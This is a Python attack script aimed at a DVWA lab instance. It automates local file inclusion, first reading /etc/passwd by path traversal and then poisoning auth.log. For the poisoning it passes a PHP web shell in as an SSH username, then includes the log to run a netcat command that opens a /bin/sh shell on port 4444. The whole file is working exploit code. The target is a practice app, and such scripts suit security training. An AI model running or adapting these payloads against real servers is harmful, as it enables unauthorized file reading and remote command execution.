#!/usr/bin/env python

#https://docs.python.org/2/library/subprocess.html
#https://www.crummy.com/software/BeautifulSoup/bs4/doc/
#https://www.pythonforbeginners.com/cheatsheet/python-mechanize-cheat-sheet

from termcolor import colored
import mechanize
import re
import time
import subprocess
import os
from bs4 import BeautifulSoup

br = mechanize.Browser()
response1 = br.open('http://192.168.30.143/dvwa/login.php')
br.select_form(nr=0)
br.set_value("admin", name="username", nr=0)
br.set_value("password", name="password", nr=0)
br.submit()


response2=br.open('http://192.168.30.143/dvwa/security.php')
br.select_form(nr=0)
br.set_value(['low'], name='security', nr=0)
br.submit()


baseurl = 'http://192.168.30.143/dvwa/vulnerabilities/fi/?page='
LFI = '../'
path = 'etc/passwd'

for dotdot in range(1,10):
 fileinclusionpayload = baseurl+LFI*dotdot+path
 fileinclusionpayloadresponse=br.open(fileinclusionpayload)
 soup = BeautifulSoup(fileinclusionpayloadresponse.read(),'lxml')
 content=soup.text
 if re.search("/root:/bin/bash",content):
  print colored(fileinclusionpayload+" is vulnerable! (Local File Inclusion Found)" , 'green')
  time.sleep(2)
  response3=br.open(fileinclusionpayload)
  print response3.read()
  break
 else:
  continue

#Default permission in kali for auth.log is only grant to root
# As like below
#ls -la /var/log/auth.log
#-rw-r----- 1 root adm 638672 XYX 17 11:55 /var/log/auth.log
#For testing purpose, we just change grant read permission to all
#chmod 644 /var/log/auth.log
# ls -la /var/log/auth.log
#-rw-r--r-- 1 root adm 638672 XXX 17 11:55 /var/log/auth.log
# For try to get a remote shell from victim machine, this change is needed

print colored('Try to get a shell...ph33r','red')

#['ssh', '<?php system($_GET[cmd]); ?>@192.168.30.143']

print colored('Just press no, as usual like ssh login','cyan')

command=['ssh', '<?php system($_GET[shel]); ?>@192.168.30.143']
p = subprocess.Popen(command)

time.sleep(2)

print colored('If you think this is stuck just interrupt CTRL+C','yellow')
print colored('CHECK REMOTE MACHINE 4444 PORT , e.g. nc -nv 192.168.30.143 4444','green')

time.sleep(2)
exploiturl='http://192.168.30.143/dvwa/vulnerabilities/fi/?page=../../../../../../var/log/auth.log&shel=%20nc%20-lvp%204444%20-e%20/bin/sh'
exploiturlresponse=br.open(exploiturl)


#os.system ('nc -nv 192.168.30.143 4444')
